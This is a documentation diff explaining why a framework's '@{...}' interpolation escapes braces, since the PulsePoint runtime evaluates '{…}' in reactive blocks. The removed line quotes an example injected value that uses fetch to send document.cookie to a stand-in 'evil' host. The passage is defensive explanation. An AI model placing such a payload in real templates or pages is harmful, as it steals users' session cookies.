@@ -19,9 +19,10 @@ belong at the proxy or gateway.
 
 `@{...}` interpolation escapes values in HTML text and attributes, braces
 included: `{` and `}` become `&#123;` and `&#125;`. Braces are not
-HTML-special, but the PulsePoint runtime compiles every `{…}` in a reactive
-block, so an unescaped stored value like `{fetch('//evil/' + document.cookie)}`
-would execute. Attribute spreads (`@{..attrs}`) follow the same rule. `Html`
+HTML-special, but the PulsePoint runtime looks up every `{…}` in a reactive
+block: a bare name reads the block's state, and the exact source of a compiled
+binding runs it. An unescaped stored value could therefore read state or run
+code the page already carries. Attribute spreads (`@{..attrs}`) follow the same rule. `Html`
 values bypass escaping because they are already trusted, and keep their braces
 live.
 
